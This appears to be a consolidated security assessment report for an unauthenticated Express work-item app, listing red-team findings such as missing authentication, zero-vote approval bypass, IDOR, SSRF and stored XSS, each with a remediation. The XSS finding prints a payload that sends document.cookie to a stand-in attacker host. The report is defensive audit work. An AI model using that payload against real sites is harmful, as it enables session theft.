Objectives Breached
Risk Statement: The dev-crew Source App has no authentication, no authorization, no rate limiting, no TLS, and no audit logging. Any unauthenticated caller on the network can create, read, modify, or delete any work item, bypass the assessment pod, and exfiltrate the entire dataset in a single request. The red team confirmed 9 live exploits including 2 Critical breaches. This application presents an unacceptable risk for deployment in any environment accessible to untrusted parties.

Top 3 Risks

  1. Complete Authentication Absence (MERGED-001 / Critical / Confirmed): Zero auth middleware. Every endpoint — including approve, reject, dispatch, hard-delete — is reachable by any anonymous HTTP caller. Confirmed live by red team across all API domains.
  2. State Machine Bypass — Zero-Vote Approval (MERGED-002 / Critical / Confirmed): PATCH /api/feature-requests/:id allows direct status escalation to "approved" without votes, bypassing the entire assessment pod. All 4 pentest objectives achieved via this class of attack.
  3. IDOR + Full Dataset Exfiltration (MERGED-003, MERGED-005 / High / Confirmed): Any caller can overwrite or delete any work item by ID; GET /api/search?q= returns the entire database unauthenticated in a single request.

Consolidated Findings

Critical (2)

MERGED-001

Complete Authentication Absence — Every API Endpoint Open to Anonymous Callers

Critical Confirmed Live Exploit CWE-306 OWASP A07 static-analyzer · pen-tester · compliance-auditor · red-teamer

Constituent IDs: SAST-001 · PEN-001 · COMP-01 · RED-001

Affected Files: Source/Backend/src/app.ts · portal/Backend/src/index.ts

Zero authentication or authorization middleware exists in the Express application. No JWT, no session, no API-key, no RBAC — nothing. All workflow state transition endpoints including approve, reject, dispatch, and hard-delete are reachable by any unauthenticated HTTP caller.

Red Team Evidence: BUG-0001 was created, triaged, resolved, and hard-deleted by an anonymous caller with no Authorization header. FR-0001 was created and approved without any credential. Every endpoint in the critical_entry_points list accepted requests with no auth and returned 200/201.

Remediation: Add mandatory authentication middleware (JWT or API-key) before all route mounts in both Source/Backend/src/app.ts and portal/Backend/src/index.ts. Define a role model (viewer, operator, admin). Scope state-mutation endpoints to authenticated roles.
MERGED-002

State Machine Bypass — Items Approved with Zero Votes, No Assessment Pod

Critical Confirmed Live Exploit CWE-284 OWASP A01 pen-tester · red-teamer

Constituent IDs: PEN-002 · PEN-003 · RED-002 · RED-009

Affected Files: portal/Backend/src/routes/featureRequests.ts · Source/Backend/src/routes/workflow.ts

Two confirmed bypass paths: (1) PATCH /api/feature-requests/:id allows direct status escalation to "approved" — the vote majority check only exists in the dedicated /approve endpoint. (2) POST /api/feature-requests/:id/deny transitions an item from "potential" to "denied" without any AI voting round.

Red Team Evidence: FR-0002 confirmed in approved state with votes: [] and human_approval_approved_at: null. FR-0011 confirmed denied without any vote. Objectives 1 and 3 both achieved via this finding.

Remediation: Remove "approved" and "denied" from the PATCH-accessible status transition map. These transitions must only be reachable through dedicated endpoints (/approve, /force-approve, /deny) that enforce vote majority checks and require authentication with an approver role.

High — Confirmed Live (4)

MERGED-003

IDOR — Arbitrary Cross-User Content Modification and Permanent Deletion

High Confirmed Live Exploit CWE-639 pen-tester · red-teamer

Constituent IDs: PEN-004 · RED-003

All endpoints use req.params.id directly with no ownership or tenancy check. Any caller who knows a work item UUID can read, overwrite, or permanently delete it.

Red Team Evidence: FR-0003 (created by "Alice") had its description overwritten to "PWNED BY BOB" and priority escalated to critical by an anonymous second session. BUG-0001 permanently hard-deleted — unrecoverable.

Remediation: Implement ownership checks on all :id routes. After authentication is added, verify requesting user's identity against resource ownership. Require an explicit admin role for hard-delete operations.
RED-004

Bug Lifecycle State Machine Fully Traversable Without Authentication

High Confirmed Live Exploit CWE-284 red-teamer

An anonymous caller walked BUG-0001 through its full lifecycle (reported → triaged → in_development → resolved) with no authentication, no engineer assignment, no review gate. The PATCH handler allows arbitrary status transitions without any guard.

Remediation: Require authentication AND a role check (engineer or admin) for triage, resolve, close, and reopen endpoints. PATCH must not permit transitions to resolved states without role enforcement.
MERGED-005

Pagination Bypass — Full Dataset Exfiltrated in a Single Unauthenticated Request

High Confirmed Live Exploit CWE-200 static-analyzer · pen-tester · red-teamer

Constituent IDs: SAST-003 · PEN-005 · RED-006

The limit query parameter is accepted but not enforced server-side.

Red Team Evidence: GET /api/feature-requests?limit=1 returned all 10 items (limit completely ignored). GET /api/search?q= (empty query) returned all 14 items (FRs + Bugs combined). Response included IDs, titles, descriptions, statuses, vote decisions, and dependency graphs.

Remediation: Enforce server-side MAX_LIMIT = 100. Return HTTP 400 for out-of-range values. Require minimum 2 characters for search q parameter or reject empty queries entirely.
RED-008

Stored XSS — Malicious Script Payloads Persisted Verbatim

High Confirmed (Backend storage verified) CWE-79 red-teamer

POST /api/feature-requests accepted and persisted <script>alert(1)</script> in title and <img src=x onerror=fetch('http://attacker.com?c='+document.cookie)> in description verbatim. Any frontend rendering these fields as innerHTML would execute arbitrary JavaScript.

Red Team Evidence: GET /api/feature-requests/FR-0010 returned the script payload unmodified. Frontend render path not verified in this test run.

Remediation: Sanitize all text inputs server-side using an allowlist (strip HTML/script tags via DOMPurify or equivalent). Never use dangerouslySetInnerHTML with user content. Add a Content-Security-Policy header.

High — Theoretical (9)

RED-007

Unauthenticated Orchestrator Proxy — Server-Side Request Forgery (SSRF)

High Attempted — Orchestrator Offline in Test Env CWE-918 red-teamer

POST /api/orchestrator/* blindly proxies to ORCHESTRATOR_URL with no authentication check. Confirmed: request was forwarded to localhost:8080 (received 502 — offline). In production with orchestrator reachable, any anonymous caller can trigger agent team runs or exfiltrate pipeline data.

Remediation: Add authentication middleware on /api/orchestrator. Validate ORCHESTRATOR_URL against a trusted allowlist. Log all proxy invocations with caller identity.
PEN-007

Cascade Auto-Dispatch Fires on Blocker Rejection — Business Logic Flaw

High Theoretical CWE-840 pen-tester

DISPATCH_TRIGGER_STATUSES includes Rejected. When a blocker item is rejected, onItemResolved auto-dispatches approved dependent items — even though the blocker's work was never completed. An attacker can create a high-priority blocked item, reject its blocker, and force the dependent item into in-progress.

Remediation: Remove Rejected from DISPATCH_TRIGGER_STATUSES. Cascade dispatch should only fire on Completed. A rejected blocker means the blocking concern is unresolved.
MERGED-009

Unauthenticated Webhook Intake — No HMAC Validation, No Enum Guards

High Theoretical CWE-20 OWASP A08 static-analyzer · pen-tester · compliance-auditor

Constituent IDs: SAST-002 · PEN-008 · COMP-06

Both /api/intake/zendesk and /api/intake/automated accept payloads with no authentication and no HMAC-SHA256 signature verification. type and priority fields are not validated against their enum types, allowing arbitrary string injection.

Remediation: Validate payloads using HMAC-SHA256 against a shared secret. Reject requests with missing or invalid signatures. Add enum validation matching the guard in workItems.ts.
SAST-008

Docker Socket Mounted in Orchestrator Container — Container Escape Vector

High Theoretical CWE-269 static-analyzer

The orchestrator container is granted access to /var/run/docker.sock. A compromised container can spawn privileged containers, mount host filesystems, and achieve full host OS compromise.

⚠ Platform scope (platform/docker-compose.yml) — remediation requires a solo session per project rules.

Remediation: Use a Docker socket proxy (e.g., docker-socket-proxy) that limits the available API surface, or assess whether direct Docker API access is truly required.
COMP-02

No Transport Layer Security — All Traffic Transmitted in Plaintext

High Theoretical CWE-319 ASVS V9.1.1 compliance-auditor

The backend binds to plain HTTP. No TLS configuration exists anywhere in source. All future credentials and tokens would be transmitted in the clear.

Remediation: Terminate TLS at a reverse proxy (nginx/Caddy/AWS ALB) with a valid certificate. Enforce HSTS. Add redirect-to-HTTPS middleware in Express.
COMP-03

No CORS Policy — Cross-Origin Requests Unrestricted

High Theoretical CWE-942 ASVS V14.5.1 compliance-auditor

No CORS middleware applied. Combined with complete absence of authentication, cross-origin request forgery is trivially possible from any origin.

Remediation: Install cors and configure explicit allowlist: app.use(cors({ origin: ['https://app.example.com'], credentials: true })).
COMP-07

Required Audit Events Not Emitted — SOC2 CC7.1 Violation

High Theoretical SOC2 CC7.1 ASVS V7.2.1 compliance-auditor

Four mandatory audit event types (login_attempt, permission_denied, state_transition, data_export) are not emitted anywhere. changeHistory on WorkItem is not an audit log — no actor identity, no integrity protection, not queryable as events.

Remediation: Implement a dedicated audit-log service emitting structured JSON events with event_type, actor_id, resource_type, resource_id, timestamp, outcome. Emit state_transition events in the workflow service.
COMP-11

No Session Management, Token Expiry, or MFA

High Theoretical ASVS V3.1.1 compliance-auditor

No session layer exists. No session tokens issued, no token expiry enforced, no MFA available. Dependent on MERGED-001 resolution.

Remediation: After authentication is added, implement stateless JWT with short expiry (15 min access / 8 hr refresh). Add TOTP-based MFA for administrative roles.
COMP-10

No Role-Based Access Control — No Principle of Least Privilege

High Theoretical ASVS V4.1.3 SOC2 CC6.3 compliance-auditor

No user roles or permission scopes. All endpoints equally open. Dispatch and approve actions require the same zero credentials as read operations. Dependent on MERGED-001 resolution.

Remediation: Define role model (viewer, operator, admin). Implement RBAC middleware. Dispatch and approve must require elevated privileges.

Medium (6)

MERGED-016

Unauthenticated Prometheus /metrics — 39 Metric Families Exposed

Medium Confirmed Live Exploit CWE-200 static-analyzer · pen-tester · compliance-auditor · red-teamer

Constituent IDs: SAST-004 · PEN-010 · COMP-08 · RED-005

GET /metrics is publicly accessible. Red team confirmed 39 metric families exposed including all API route paths (derived from histogram labels), approval/denial rates, and bug flow velocity. Enables targeted attack planning.

Remediation: Restrict /metrics to internal network via reverse-proxy rules, or add a bearer-token check (METRICS_TOKEN env var). Never expose on a public-facing port.
MERGED-017

Missing HTTP Security Headers — No helmet, CSP, HSTS, X-Frame-Options

Medium Theoretical CWE-116 static-analyzer · compliance-auditor

Constituent IDs: SAST-005 · COMP-04

Express sets no HTTP security headers. Missing: Content-Security-Policy, X-Frame-Options, Strict-Transport-Security, X-Content-Type-Options. X-Powered-By: Express reveals the server stack.

Remediation: app.use(helmet()) as first middleware. Configure contentSecurityPolicy, hsts (production), disable x-powered-by.
SAST-009

Host Claude Credentials File Bind-Mounted into Orchestrator Container

Medium Theoretical CWE-522 static-analyzer

~/.claude/.credentials.json is bind-mounted read-only into the orchestrator container. A compromised orchestrator can read and exfiltrate API credentials.

⚠ Platform scope (platform/docker-compose.yml) — remediation requires a solo session per project rules.

Remediation: Pass the credential value as a Docker secret or environment variable: environment: CLAUDE_API_KEY=${CLAUDE_API_KEY}
MERGED-019

No Rate Limiting — Memory Exhaustion DoS via Intake Spam

Medium Theoretical CWE-400 pen-tester · compliance-auditor

Constituent IDs: PEN-009 · COMP-05

No rate-limiting middleware on any endpoint. Combined with unauthenticated intake endpoints, an attacker can flood the in-memory store. limit parameter has no server-enforced maximum.

Remediation: Install express-rate-limit. Apply stricter limits to mutation endpoints. Cap limit to MAX_LIMIT = 100.
PEN-006

Soft-Deleted Blocker Permanently Blocks Dependent Item Dispatch

Medium Theoretical CWE-840 pen-tester

findById returns undefined for soft-deleted items. computeHasUnresolvedBlockers treats undefined as still-blocking. A dependent item becomes permanently stuck in approved status after its blocker is deleted.

Remediation: When soft-deleting a blocker, automatically remove all blockedBy references to it. Or treat a deleted blocker as resolved in computeHasUnresolvedBlockers.
COMP-12

No Data Retention or Hard-Deletion Policy

Medium Theoretical ASVS V8.3.4 compliance-auditor

Soft-deleted records remain in-memory indefinitely. No persistent store — all data lost on restart. No retention schedule for completed/rejected items.

Remediation: Implement a persistent database. Add hard-delete and a retention policy (completed/rejected items purged after N days) with a scheduled purge job.
